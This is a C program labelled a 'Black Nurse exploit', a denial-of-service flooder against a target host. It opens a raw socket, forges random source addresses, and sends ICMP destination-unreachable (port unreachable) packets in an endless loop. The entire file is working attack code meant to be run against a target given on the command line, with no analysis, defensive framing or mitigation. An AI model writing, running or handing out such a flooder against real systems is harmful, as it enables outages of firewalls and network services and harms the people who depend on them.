#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#define PAYLOAD_SIZE 512

typedef unsigned char u8;
typedef unsigned short int u16;


unsigned short icmpChecksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1) 
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) 
    {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return (answer);
}

int main(int argc, char **argv)
{
    printf("[+] Black Nurse exploit\n");
    if (argc < 1)
    {
        printf("[-] Missing argument, target");
        printf("    Usage: %s <target>\n", argv[0]);
        return -1;
    }
    int currentCode, sent, sentSize;
    int option = 1;

    // Random source, let's not care about it
    unsigned long source = rand();
    
    // Parse target in argv[1]
    unsigned long target = inet_addr(argv[1]);

    // Create our raw socket
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (sockfd < 0)
    {
        perror("[-] Can't create socket, are you root ?");
        return -1;
    }

    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&option, sizeof (option)) == -1)
    {
        perror("[-] Can't set socketopts IP_HDRINCL (to set custom options on IPV4 layer)");
        return -1;
    }

    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&option, sizeof (option)) == -1)
    {
        perror("[-] Can't set socketopts for broadcast");
        return -1;
    }
    
    // Final packet size
    int finalPacketSize = sizeof (struct iphdr) + sizeof (struct icmphdr) + PAYLOAD_SIZE;
    char *packet = (char *) malloc (finalPacketSize);

    if (!packet)
    {
        perror("[-] Cannot allocate memory, if you never got this error before, you are lucky !");
        close(sockfd);
        return -1;
    }
    // Sanitizing our memory
    memset (packet, 0, finalPacketSize);

    // Point our IP header to our allocated packet memory block
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));

    // Set IPv4 header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (finalPacketSize);
    ip->id = rand();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = source;
    ip->daddr = target;

    // Set ICMP data
    icmp->type = ICMP_DEST_UNREACH;
    icmp->code = 0;
    icmp->un.echo.sequence = rand();
    icmp->un.echo.id = rand();

    // Checksum will be calculated later
    icmp->checksum = 0;


    // Create sockaddr
    struct sockaddr_in sockAddress;
    sockAddress.sin_family = AF_INET;
    sockAddress.sin_addr.s_addr = target;
    memset(&sockAddress.sin_zero, 0, sizeof (sockAddress.sin_zero));

    puts("[+] Sending packets\n");

    // Let the packet storm begin !
    while (1)
    {
        icmp->code = 3;
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, PAYLOAD_SIZE);

        icmp->checksum = 0;
        icmp->checksum = icmpChecksum((unsigned short *)icmp, sizeof(struct icmphdr) + PAYLOAD_SIZE);

        if ( (sentSize = sendto(sockfd, packet, finalPacketSize, 0, (struct sockaddr*) &sockAddress, sizeof (sockAddress))) < 1)
        {
            perror("[-] Packet send failed\n");
            free(packet);
            close(sockfd);
            return -1;
        }
        printf("[+] Already sent %d packets\r", ++sent);
        fflush(stdout);
    }

    // Code will never reach this point
    free(packet);
    close(sockfd);

    return 0;
}
